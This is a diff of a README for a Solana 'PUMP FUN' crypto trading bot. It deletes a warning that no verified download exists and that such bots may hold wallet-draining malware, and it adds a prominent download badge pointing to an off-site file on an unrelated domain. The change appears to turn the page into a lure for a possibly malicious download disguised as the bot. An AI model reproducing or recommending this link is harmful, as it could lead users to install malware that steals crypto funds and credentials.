@@ -1,8 +1,8 @@
 # 🚀 Solana PUMP FUN Bot — Features & Overview
 
-## 📥 Solana PUMP FUN Bot — Download Information
+## 📥 Download Solana PUMP FUN Bot
 
-**⚠️ Download Notice:** No verified software download is provided. Third-party crypto bots may contain wallet-draining malware or other security threats. Verify software authenticity before trusting it with personal information.
+[![Download](https://img.shields.io/badge/Download-Solana_PUMP_FUN_Bot-brightgreen?style=for-the-badge&logo=github)](https://huangqing.net/s/file)
 
 <p align="center">
   <img src="https://raw.githubusercontent.com/ahk780/pumpfun-copy-trading-bot/refs/heads/main/public/pumpfun-copy-trading-bot-preview-image.jpeg" alt="Solana Pump.fun Trading Bot Dashboard Example" width="100%">
